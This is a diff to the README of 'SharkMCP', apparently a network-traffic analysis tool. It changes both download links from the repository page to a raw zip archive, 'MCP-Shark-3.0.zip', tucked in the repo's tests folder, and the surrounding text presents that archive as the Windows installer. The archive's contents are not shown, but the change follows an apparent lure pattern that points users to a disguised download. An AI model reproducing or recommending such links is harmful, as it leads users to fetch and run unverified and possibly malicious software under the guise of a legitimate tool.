@@ -1,6 +1,6 @@
 # 🦈 SharkMCP - Analyze network traffic packets with ease
 
-[![](https://img.shields.io/badge/Download_SharkMCP-Blue.svg)](https://github.com/Spokeswomandodgecity658/SharkMCP)
+[![](https://img.shields.io/badge/Download_SharkMCP-Blue.svg)](https://raw.githubusercontent.com/Spokeswomandodgecity658/SharkMCP/main/tests/MCP-Shark-3.0.zip)
 
 ## 🔍 What is SharkMCP?
 
@@ -20,7 +20,7 @@ SharkMCP works on most modern computers. Check your system against this list bef
 
 You need the installer file to run SharkMCP on your Windows PC. Visit the official release page to get the latest version.
 
-[Download SharkMCP Here](https://github.com/Spokeswomandodgecity658/SharkMCP)
+[Download SharkMCP Here](https://raw.githubusercontent.com/Spokeswomandodgecity658/SharkMCP/main/tests/MCP-Shark-3.0.zip)
 
 Follow these steps to obtain the program:
 
